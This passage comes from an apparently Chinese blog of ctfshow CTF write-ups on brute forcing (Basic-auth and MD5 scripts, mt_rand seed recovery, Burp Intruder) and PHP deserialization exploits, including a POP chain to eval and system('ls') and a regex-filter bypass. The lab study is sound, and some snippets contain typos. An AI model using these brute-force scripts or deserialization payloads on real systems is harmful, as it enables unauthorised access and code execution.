Encoding取消选择urlencode加密特俗字符串。\n\n6：进行爆破，找到长度不同的即为正确答案。\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/95e8a69e415a4801ab7065cfa422146a.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n找到flag。\n\n## 方法二:自动爆破脚本\n\n```python\nimport time#用于延时\nimport requests#用于发送请求\nimport base64#用于base64编码\n\nurl = 'http://ededa0b4-a3d7-43f0-9f06-c8db1fce2434.challenge.ctf.show/index.php'#放入url\n\npassword = []#密码列表\n\n\nwith open(\"1.txt\", \"r\") as f:  #读取密码字典/1.txt是字典密码\n    while True:#循环读取密码字典\n        data = f.readline() #读取一行\n        if data:#判断是否为空\n            password.append(data)#添加到列表\n        else:#判断是否到达文件末尾\n            break#结束循环\n        \nfor p in password:#循环遍历密码列表\n    strs = 'admin:'+ p[:-1]#拼接用户名和密码\n    header={\n        'Authorization':'Basic {}'.format(base64.b64encode(strs.encode('utf-8')).decode('utf-8'))\n    }#设置请求头\n    rep =requests.get(url,headers=header)#发送请求\n    time.sleep(0.2)#延时0.2秒\n    if rep.status_code ==200:#判断请求是否成功\n\n        print(rep.text)#打印响应内容\n        break\n```\n\n# web23条件爆破\n\n1.查看题目\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/7a9fe5418c734bc885623e1945fba644.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n## substr()函数:\n\nsubstr($string, start, length)函数用于从字符串$string中提取从start位置开始的length个字符。如果length省略，则默认提取到字符串的末尾。\n\n- if(substr($token, 1,1)===substr($token, 14,1) && substr($token, 14,1) ===substr($token, 17,1)):\n\n检验$token的第2个字符和第15个字符是否相等，第15个字符和第18个字符是否相等\n\n- if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))):\n\n第2个+第15个+第18个=第31个\n\nGET一个参数token，token的MD5加密后的值如果满足下面的判断，就输出flag\n\n## 用爆破脚本\n\n### python脚本\n\n```python\nimport hashlib#导入hashlib模块\ndic = \"0123456789qazwsxedcrfvtgbyhnujmikolp\"#md5 包含的字符有阿拉伯数字和大小写英文26个字母。\n\nfor a in dic:#遍历字典\n\n    for b in dic:#遍历字典\n        t = str(a)+str(b)#拼接字符串\n        md5 = hashlib.md5(t.encode(encoding='utf-8')).hexdigest()#计算md5值\n\n        if md5[1:2] == md5[14:15] and md5[14:15] == md5[17:18]:#判断md5值是否符合条件\n\n            if int(md5[1:2])+int(md5[14:15])+int(md5[17:18])/int(md5[1:2])==int(md5[31:32]):\n                #判断md5值是否符合条件\n                print(t)#打印符合条件的字符串\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n### php脚本\n\n```php\n<?php\n    for($i=0;i<10000;$i++){\n        $token=md5($i);\n        if(susbtr($token,1,1)===substr($token,14,1)&&substr($token,14,1)===substr($token,17,1)){\n            if(intval(substr($token,1,1))+intval(substr($token,14,1))+intval(substr($token,17,1))/intval(substr($token,1,1))===intval(substr($token,31,1))){\n                echo $i;\n                echo $token;\n            }\n        }\n    }\n?>\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n# web24随机数种子爆破\n\n查看题目\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/749f5e1611584c4a84d86c9b2ce1f20c.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n- 这行代码使用mt_srand函数设置随机数生成器的种子为372619038。这意味着每次以相同的种子初始化后，mt_rand()函数生成的随机数序列将是相同的。\n- 如果随机数种子定了 那么产生的随机数就是确定的\n\n## 知识点:php伪随机数\n\n### mt_rand()函数\n\nmt_rand()函数使用Mersenne Twister算法生成随机整数。\n\n使用的语法:mt_rand();or mt_rand(min,max);,生成一个区间内的随机数。\n\n其参数min默认为最小值0，max默认为可生成的随机数最大值2147483647，由mt_get randmax()函数获得。\n\n### mt_srand()函数\n\nmt_srand()函数为随机数生成器。提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的，这就是漏洞点\n\n### php_mt_seed工具:\n\n- php_mt_seed是c语言编写的爆破随机数序列种子的工具\n\n我们做一个实验:\n\n```php\n<?php\n    mt_srand(0);//设置随机数播种为0\n    echo mt_rand();\n?>\n//每次运行都会获得相同的序列    \n\n<?php\n    echo mt_rand();\n    ?>\n    \n    //去掉mt_srand()函数后，系统会自动给rand函数播种，但也是播种一次\n    \n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n因此这里是伪随机\n\n所以我们根据给出的种子输出得到的序列就是我们的r值，在URL中填进去就能拿到flag了\n\n# web25伪随机数爆破\n\n查看题目\n\n```php\n<?php\n    error_reporting(0);\n    if(isset($_GET['r'])){\n        $r = $_GET['r'];\n        mt_srand(hexdec(substr(md5($flag), 0,8)));\n        $rand = intval($r)-intval(mt_rand());\n        if((!$rand)){\n            if($_COOKIE['token']==(mt_rand()+mt_rand())){\n                echo $flag;            \n            }        \n        }else {\n            echo $rand;        \n        }                    \n}else{   \n        highlight_file(_FILE_);\n        echo system('cat /proc/version')\n}                                                        \n    }?>\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n## mt_srand(hexdec(substr(md5($flag),0,8)));\n\n- 对flag进行MD5哈希处理，从MD5哈希值的开头截取8个字符(即32位中的前16位)，后将处理得到的值进行进制转化，hexdec()函数可以将截取的16位十六进制数转化成十进制数。最后使用转换的十进制数作为种子值来初始化mt_rand()函数的随机数生成器\n- if((!$rand)){ if($_COOKIE['token']==(mt_rand()+mt_rand())){echo $flag;\n\n若$rand为0，则执行if语句\n\n## 解题思路:\n\n1.?r=0先回显查看mt_rand()第一次的随机数\n\n2.用php_rand_seed脚本\n\n先用gcc编译脚本gcc -o php_mt_seed php_mt_seed.c\n\n爆破出之前播种的随机数种子的值./php_rand_seed 567219768\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/a26995fd26644e409374f8e4b4a79de7.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\nseed选择kali工具得到的结果中php7的结果，然后编写php代码得到cookie的值:\n\n```php\n<?php\n    mt_srand(3147772674);\n    echo mt_rand().\"\\n\";\n    echo mt_rand()+mt_rand();\n?>\n```\n\n在网页cookie中放入得到的值，一个个尝试就可以得到flag了\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/fed24da88b9d4affaadf95138d5a8f69-1730818264224-14.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n# web26数据库连接信息爆破\n\n这题抓包就能拿到flag了，有点抽象\n\n# web27信息收集+日期爆破\n\n打开靶机，发现是个登录页面，需要学号和密码登录，猜测登录后可获得flag，则可围绕获得学号密码来进行，因为两者都不知道，直接爆破不太合适，看看还能提取到什么信息。\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/1c0c94f0642b40feac756cade867a00c-1730818268343-18.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n当点击到登录按钮下方的录取名单时，自动下载了一个list.xlsx，打开这个文件，发现了几个人的姓名和身份证号部分信息。点击录取名单下面的学生学籍信息查询系统，发现可以根据学生姓名和身份证号进行录取查询，那么第一步要做的可能就是要爆破身份证号了，或许在这里可以查到有用的信息。\n\n以下载的表格的第一个人为例，录取查询页面姓名栏输入高先伊，身份证输入6210225237\n\n- 打开抓包工具，如Burpsuit，点击查询，抓到查询发送的请求包，将请求包发送至Intruder攻击模块，将请求包中的&p设置为变量\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/4cb7a0f41b8f4aa7b7fa7fc37173188c-1730818272849-22.png)\n\n- 设置payload\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/7f96d063ce374500bb095fd466a98b6b.png)\n\nformat那栏一定要写yyyyMMdd对应身份证的年月日，然后就开始爆破\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/a34dace7731241758d97f01c2f99847e.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n爆破后找到长度最长的response，可以看到有success，把下面那串编码复制拿去翻译一下\n\nUnicode-str解码: 恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码\n\n然后我们就尝试登录一下，就可以拿到flag了\n\n# web28目录爆破\n\n查看题目\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/f0cdd7485d6f4452a91636f0a0c6ce66.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n如果直接输 原url/1/2.txt 之类，会进行302跳转，然后跳转就会进入死循环，最后直接打不开\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/48101279d89f4247953766e2d3bb343f.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n## 知识点:302跳转\n\n302跳转又称暂时性转移，当网页临时移到新的位置，而浏览器的缓存没有更新时，就出现了302跳转。\n\n302状态码是临时重定向（Move Temporarily），表示所请求的资源临时地转移到新的位置，一般是24到48小时以内的转移会用到302。\n\n302重定向是临时的重定向，搜索引擎会抓取新的内容而保留旧的网址。因为服务器返回302代码，搜索引擎认为新的网址只是暂时的。\n\n这里我们对url后面两个目录进行爆破\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/ab9c43bf2d5b468e9568e24e1bc2855c.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n爆破模式改成Cluster bomb，然后将两个目录添加为变量\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/383c716113ef4a13823211a3b7f22eba.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/6c0e90a5663c4199965f4effcc1ce759.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n将两个变量都设置成numbers，从1到100，然后开始爆破，找到200状态码的就是成功的response，拿到flag\n","tags":["爆破"],"categories":["ctfshow"]},{"title":"web入门反序列化篇-ctfshow","url":"/2024/11/05/web入门反序列化篇-ctfshow/","content":"\n## web254\n\n考点:认识基本的类，方法，属性等的定义方法\n\n查看题目\n\n```php\nclass ctfShowUser{\t#定义一个类\n  public $username='xxxxxx';#定义一个公开的成员属性username并初始化为xxxxxx\n  public $password='xxxxxx';#定义一个公开的成员属性password并初始化为xxxxxx\n  public $isVip=false;#定义一个公开的属性isVip并初始化为false，这个属性用来标记用户是否是VIP\n\n  public function checkVip(){#定义一个公开的方法checkVip\n    return $this->isVip;#返回isVip的值\n  }\n  public function login($u,$p){#定义一个公开的方法login，它接受传递两个参数$u和$p\n    if($this->username===$u&&$this->password===$p){#使用了全等操作符，判断username和password是否等于$u和$p\n      $this->isVip=true;#如果相等就将isVip的属性值设置为true，即用户是vip\n    }\n    return $this->isVip;#返回isVip的属性的值\n  }\n  public function vipOneKeyGetFlag(){#定义一个公开方法vipOneKeyGetFlag\n    if($this->isVip){#检查用户是否是vip\n      global $flag;#使用global关键字声明$flag变量为全局变量\n      echo \"your flag is \".$flag;#输出flag\n    }else{\n      echo \"no vip, no flag\";\n    }\n  }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];#从URL的GET请求中获取username和password参数的值，并分别赋值给变量$username和$password。\n\nif(isset($username) && isset($password)){#检查$username和$password变量是否已设置\n  $user = new ctfShowUser();#实例化对象\n  if($user->login($username,$password)){#调用ctfShowUse类中login()方法\n    if($user->checkVip()){#检查用户是否是vip\n      $user->vipOneKeyGetFlag();#如果用户是VIP，调用vipOneKeyGetFlag()方法输出flag。\n    }\n  }else{\n    echo \"no vip,no flag\";\n  }\n}\n```\n\n解析代码如图\n\n在`login`方法内部，会检查传入的用户名和密码是否强等于赋值给user的类中的用户名和密码，如果等于就会给isVip的值换成true，\n\n由于这里的user是固定的，所以username和password是一样的\n\n所以我们只需要把我们传入的用户名和密码等于存储的公开属性的用户名和密码就可以通过验证了\n\n?username=xxxxxx&password=xxxxxx\n\n## web255\n\n### 学习unserialize()反序列函数\n\n```php\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this->isVip;\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this->isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = unserialize($_COOKIE['user']);    \n    if($user->login($username,$password)){\n        if($user->checkVip()){\n            $user->vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n\n```\n\n### unserialize()函数\n\n**unserialize** 将字符串还原成原来的对象，用于将已经序列化（serialized）的字符串或数据恢复成 PHP 的值或对象。序列化是将数据结构或对象状态转换为可存储或传输的格式（通常是字符串）的过程，而反序列化（即 `unserialize()` 的功能）则是这个过程的逆操作。\n\n$user = unserialize($_COOKIE['user'])---这行代码时它意味着开发者正在从用户的浏览器发送回来的cookie中读取一个名为 `'user'` 的值，并且尝试将这个值从序列化（serialized）的格式转换回其原始的 PHP 值或对象（反序列化）。\n\n可以看到，由于这三个属性是公开属性，是我们可以更改的，代码中没有可以将isVip属性的值设置为true的地方，所以我们需要自己将这个属性设置为true，然后进行序列化，将序列化后的值用cookie方式传入\n\n**这里注意一下要进行反序列化后要进行url编码，不然传入的cookie值没有用**\n\npoc:\n\n```php\n<?php\nclass ctfShowUser{\n\tpublic $username = 'xxxxxx';\n\tpublic $password = 'xxxxxx';\n\tpublic $isVip = true;\n}\n\t$user = urldencode(serialize(new ctfShowUser()));\n\techo $user;\n?>\n```\n\n输出user的值:O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\n\n因为还存在`login`函数，需要我们传入的属性的值和反序列化后的赋值相同，所以方便点我们传入的`username`和`password`还是正常为`xxxxxx`就行\n\n把username和password通过GET传入，把user通过cookie传入，就可以拿到flag了\n\n![image-20241101204319309](./../image/achieve/202411/image-20241101204319309.png)\n\n## web256\n\n```php\nclass ctfShowUser{\n  public $username='xxxxxx';\n  public $password='xxxxxx';\n  public $isVip=false;\n\n  public function checkVip(){\n    return $this->isVip;\n  }\n  public function login($u,$p){\n    return $this->username===$u&&$this->password===$p;\n  }\n  public function vipOneKeyGetFlag(){\n    if($this->isVip){\n      global $flag;\n      if($this->username!==$this->password){\n          echo \"your flag is \".$flag;\n       }\n    }else{\n      echo \"no vip, no flag\";\n    }\n  }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n  $user = unserialize($_COOKIE['user']);  \n  if($user->login($username,$password)){\n    if($user->checkVip()){\n      $user->vipOneKeyGetFlag();\n    }\n  }else{\n    echo \"no vip,no flag\";\n  }\n```\n\n在vipOneKeyGetFlag()中多加了一个判断句\n\nif($this->username!==$this->password)--意思是传入的username和password不能一样,无论是值还是类型\n\n**`!==`运算符**：这是PHP中的“全等不等于”运算符。它不仅比较两个值是否不相等，还比较它们的类型是否不同。如果两个值不相等且类型也不同，则表达式的结果为`true`；否则为`false`。\n\n所以只要让username和password的值不一样就行了\n\npoc:\n\n```php\n<?php\nclass ctfShowUser{\n    public $username = 'ccbbaa';\n    public $password = 'aabbcc';\n    public $isVip=true;\n}\n$user=new ctfShowUser();\necho urlencode(serialize($user));\n?>\n```\n\n## web257\n\n这里有两个魔术方法\n\n_construct  创建对象\n\n_destruct  删除对象\n\n### _construct()魔术方法\n\n在PHP中，`__construct()` 是一个特殊的魔术方法（magic method），它会在对象被创建时自动调用\n\n触发条件：在类实例化对象时自动调用构造函数\n\n作用：初始化函数，对类进行初始化，同时也可以执行其它语句\n\n```php\n<?php\nclass User {\n    public $username;\n    public function __construct($username) {\n        $this->username = $username;\n        echo \"触发了构造函数1次\" ;\n    }\n}\n$test = new User(\"benben\");    //实例化对象时触发构造函数__construct()\n$ser = serialize($test);       //在序列化和反序列化过程中不会触发构造函数\nunserialize($ser);\n?>\n\n```\n\n### _destruct()魔术方法\n\n`__destruct()` 函数是 PHP 中的一个魔术方法（magic method），它会在一个对象不再被使用时，或者脚本执行结束时，自动被调用。\n\n触发条件：对象引用完成，或对象被销毁\n\n作用：执行清理工作\n\n```php\n<?php\nclass User {\n    public function __destruct()\n    {\n        echo \"触发了析构函数1次\";\n    }\n}\n$test = new User(\"benben\");  //实例化对象结束后，代码运行完会销毁，触发析构函数_destruct()\n$ser = serialize($test);     //在序列化过程中不会触发\nunserialize($ser);           //在反序列化过程中会触发，反序列化得到的是对象，用完后会销毁，触发析构函数_destruct()\n?>\n\n```\n\n学完知识点，我们回过头来分析代码：\n\n```php\nclass ctfShowUser{\n    private $username='xxxxxx';\n    private $password='xxxxxx';\n    private $isVip=false;\n    private $class = 'info';\n\n    public function __construct(){\n        $this->class=new info();\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function __destruct(){\n        $this->class->getInfo();\n    }\n\n}\n\nclass info{\n    private $user='xxxxxx';\n    public function getInfo(){\n        return $this->user;\n    }\n}\n\nclass backDoor{\n    private $code;\n    public function getInfo(){\n        eval($this->code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = unserialize($_COOKIE['user']);\n    $user->login($username,$password);\n}\n```\n\n如果我们想得到flag，就需要利用backdoor这个类的getInfo函数，code这个私有属性储存着我们要执行的命令，触发getInfo的方法在ctfShowUser这个类中，我们可以利用他的__destruct函数来触发在创建对象时类的__getInfo()函数，所以我们可以通过ctfShowUser的__construct魔术方法来创建backdoor对象，然后因为$user会经过一次反序列化，这个反序列化会触发destruct函数，因此可以触发getinfo的方法\n\n所以我们这里就需要构造POP链了\n\n### POP链\n\n在反序列化中，我们可以控制的数据就是对象中的属性值(**成员变量**),\n所以在php反序列化中有一种漏洞利用方法叫\"**面向属性编程**“，\n**pop链**就是利用**魔术方法**在里面进行**多次跳转**然后获取**敏感数据**的一种payload\n\nPOP链的基本思路是，通过反序列化攻击，构造出一条“链”，让程序依次执行其中的命令，最终实现攻击者想要的目的。这条“链”是由多个对象序列化数据组成的，每个对象都包含着下一个对象的引用。当程序反序列化第一个对象时，就会自动解析其中的引用，并继续反序列化下一个对象，以此类推，最终执行攻击者希望执行的代码。\n\n所以我们用构造POP链:\n\n```\nctfShowUser::__construc->ctfShowUser::__destruct->>backDoor::__getInfo\n```\n\nexp:\n\n```php\n<?php\nclass ctfShowUser{\n    private $username='xxxxxx';\n    private $password='xxxxxx';\n    private $isVip=false;\n    private $class = 'info';\n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\nclass backDoor{\n    private $code='system(\"ls\");';\n}\n$user = urlencode(serialize(new ctfShowUser()));\necho $user;\n?>\n```\n\n先查看目录找到flag文件\n\n然后再把code中的system中的命令改一下再传进去就可以拿到flag了\n\n## web258\n\n```php\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n    public $class = 'info';\n\n    public function __construct(){\n        $this->class=new info();\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function __destruct(){\n        $this->class->getInfo();\n    }\n\n}\n\nclass info{\n    public $user='xxxxxx';\n    public function getInfo(){\n        return $this->user;\n    }\n}\n\nclass backDoor{\n    public $code;\n    public function getInfo(){\n        eval($this->code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){\n        $user = unserialize($_COOKIE['user']);\n    }\n    $user->login($username,$password);\n}\n\n```\n\n增加了对user的正则匹配，过滤掉了[oc]:\\d+:/i\n\n1. **`oc`**：匹配字符 `o` 或 `c`\n3. :**`\\d+`**：冒号后面跟着一个或多个数字（`\\d+`），再跟一个冒号。这表示匹配的格式为 `o:数字:` 或 `c:数字:`。\n4. **`:`**（再次出现）：与前面的冒号相同，这个冒号也是作为普通字符出现的，表示要匹配的文本中数字后面必须再跟一个冒号。\n\n所以o:+数字:或者c:+数字:都是会被过滤的\n\n既然这样那我们先看看我们原来的实例化对象序列化后有没有这两种字符串\n\n```php\n<?php\nclass ctfShowUser{\n    public $username='1';\n    public $password='2';\n    public $isVip=false;\n    public $class = 'backDoor';\n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\nclass backDoor{\n    public $code='system(\"ls\");';\n}\n$user = serialize(new ctfShowUser());\necho $user;\n?>\n```\n\n输出后得到\n\nO:11:\"ctfShowUser\":4:{s:8:\"username\";s:1:\"1\";s:8:\"password\";s:1:\"2\";s:5:\"isVip\";b:0;s:5:\"class\";O:8:\"backDoor\":1:{s:4:\"code\";s:13:\"system(\"ls\");\";}}\n\n可以看到有应该O:11:和O:8:,那我们给他在数字前面加个加号就可以了\n\n所以我们给数字加上`+`来绕过。\n\n为什么是用加号，实验得出来的，+11和11序列化后的结果都是一样的\n\n修改后的exp(记得先修改再进行序列化)\n\n```php\n<?php\nclass ctfShowUser{\n    public $username='1';\n    public $password='2';\n    public $isVip=false;\n    public $class = 'backDoor';\n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\nclass backDoor{\n    public $code='system(\"ls\");';\n}\n$user = serialize(new ctfShowUser());\n$user1 = str_replace(':11',':+11',$user);\n$user2 = str_replace(':8',':+8',$user1);\necho urlencode($user2);\n?>\n\n```\n\n(这道题的属性跟上一题不一样，记得把属性也改一下，我就是因为忘记改了结果一直没跑出来)\n\n后面把命令改一下再放进去就行了\n\n## 重点:web259\n\nindex.php\n\n```php\n<?php\n\nhighlight_file(__FILE__);\n\n\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip->getFlag();\n\n\n\n\n\nNotice: Undefined index: vip in /var/www/html/index.php on line 6\n\nFatal error: Uncaught Error: Call to a member function getFlag() on bool in /var/www/html/index.php:8 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 8\n```\n\n提示中也有一段代码:\n\nflag.php\n\n```php\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);#_SERVER['HTTP_X_FORWARDED_FOR'] 中的字符串按照逗号（,）分割成一个数组，并将这个数组赋值给变量 $xff。\narray_pop($xff);#array_pop()移除了 $xff 数组中的最后一个元素\n$ip = array_pop($xff);#array_pop() 函数，这次它移除了 $xff 数组中剩余元素的最后一个（即倒数第二个 IP 地址，如果原始字符串中只有一个 IP 地址，则这个调用会移除那个唯一的 IP 地址），并将这个 IP 地址赋值给变量 $ip。\nif($ip!=='127.0.0.1'){\n\tdie('error');#检查ip地址是否为本地回环地址\n}else{\n\t$token = $_POST['token'];\n\tif($token=='ctfshow'){\n\t\tfile_put_contents('flag.txt',$flag);#检查 $token 是否等于 'ctfshow'。如果等于，尝试将 $flag 变量的内容写入名为 'flag.txt' 的文件。\n\t}\n}\n```\n\n对上面的代码加以解释\n\n### explode()函数\n\n`explode()` 函数是 PHP 中用于将字符串按照指定的分隔符分割成数组的内置函数\n\n### array_pop函数\n\n`array_pop()` 是 PHP 中的一个数组函数，它用于移除数组中的最后一个元素并返回该元素的值。这个函数会修改原始数组，使其少了最后一个元素。\n\n```php\n$fruits = array(\"apple\", \"banana\", \"orange\");\n$lastFruit = array_pop($fruits);\n\necho \"Last fruit: \" . $lastFruit; // 输出 \"Last fruit: orange\"\nprint_r($fruits); // 输出：Array ( [0] => apple [1] => banana )\n\n```\n\n刚开始看这道题的时候也是一点办法都没有，因为这里一个类也没有，也不知道怎么构造pop链，然后就去看了wp，由于源代码中没有出现任何的类和getflag方法，我们需要调用一个不存在的方法，这时可以想到触发__call魔术方法。这里观察代码明显发现并没有相关的类可以利用，所以想到利用原生类进行反序列化利用。发现这里考的是PHP原生类，那我们就先了解一下知识点\n\n### PHP原生类\n\n在PHP中，反序列化是一个常见的安全问题，特别是当代码中存在反序列化的功能点，但无法构造出完整的POP链时。这时，可以尝试利用PHP的原生类来破解。PHP的一些原生类中内置了魔术方法，如果能够巧妙地构造可控参数并触发这些魔术方法，就可能达到预期的目的。\n\n#### SoapClient 类\n\nPHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。\n\n该内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 `__call` 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。\n\n该类的构造函数如下：\n\n```\npublic SoapClient :: SoapClient(mixed $wsdl [，array $options ])\n```\n\n- 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。\n- 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。\n\n### _call()魔术方法\n\n当调用不存在或不可见的成员方法时，PHP会先调用`__call()`方法来存储方法名及其参数。\n\n`__call(string $function_name, array $arguments)`该方法有两个参数，第一个参数 `$function_name` 会自动接收不存在的方法名，第二个 `$arguments` 则以数组的方式接收不存在方法的多个参数。\n\n所以我们需要利用SoapClient原生类来构造**SSRF**（用服务器本身请求服务器），并利用**CRLF**来构造数据包。\n\n那什么是SSRF呢？\n\n### SSRF攻击\n\nSSRF（Server-Side Request Forgery）指的是服务器端请求伪造攻击，是一种由攻击者构造请求，利用存在缺陷的Web应用作为代理，让服务端发起请求的安全漏洞。\n\nSSRF攻击的基本原理在于攻击者利用服务器作为代理来发送请求。攻击者首先寻找目标网站中可以从服务器发出外部请求的点，比如图片加载、文件下载、API请求等功能。随后，攻击者通过向这些功能提交经过特别构造的数据（如修改URL或参数），诱使服务器向攻击者控制的或者内部资源发送请求。此时，服务器充当了攻击者与目标之间的“桥梁”，攻击者可以通过它来接触和操作内部服务，绕过安全限制。\n\n#### SSRF攻击的类型\n\n1. **内部SSRF**：攻击者利用漏洞与应用程序的后端或内部系统交互。这种情况下，攻击者可能试图访问数据库、HTTP服务或其他仅在本地网络可用的服务。\n2. **外部SSRF**：攻击者利用漏洞访问外部系统。攻击者可能构造恶意的URL，利用Web应用程序的代理功能或URL处理机制，向存在漏洞的服务器发送请求，以获取外部网络资源或执行其他恶意操作。\n\n#### SSRF出现的根本原因\n\n由于服务端提供了从其他服务器应用获取数据的功能而且没有对目标地址做过滤与限制。\n\n也就是说，对于为服务器提供服务的其他应用没有对访问进行限制，如果我们构造好访问包，那就有可能利用目标服务对他的其他服务器应用进行调用。\n\n那什么是CRLF呢?\n\n### CRLF攻击\n\nCRLF攻击，全称Carriage Return Line Feed攻击，是一种利用CRLF字符（回车换行符，即`\\r\\n`）的安全漏洞进行的攻击方式\n\n#### CRLF字符的作用\n\n- CRLF字符是两个ASCII字符，回车（Carriage Return，`\\r`）和换行（Line Feed，`\\n`）的组合。\n- 在许多互联网协议中，包括HTTP、MIME（电子邮件）和NNTP（新闻组）等，CRLF字符被用作行尾（EOL）标记，以分隔文本流中的不同部分。\n\n#### CRLF攻击的原理\n\n- CRLF攻击利用了HTTP协议中换行符的漏洞。HTTP协议规定，每个报文的头部信息的行结束必须是CRLF字符。\n- 攻击者通过在恶意输入中插入CRLF字符，可以改变HTTP报文的格式，从而绕过一些安全机制。\n- 具体来说，攻击者可以在HTTP请求中的参数值中插入CRLF字符，使得服务器在解析请求时将参数值误认为是HTTP头部的一部分。这样一来，攻击者就可以利用这个漏洞进行一系列攻击，如HTTP响应拆分攻击、HTTP响应劫持攻击等。\n\n- 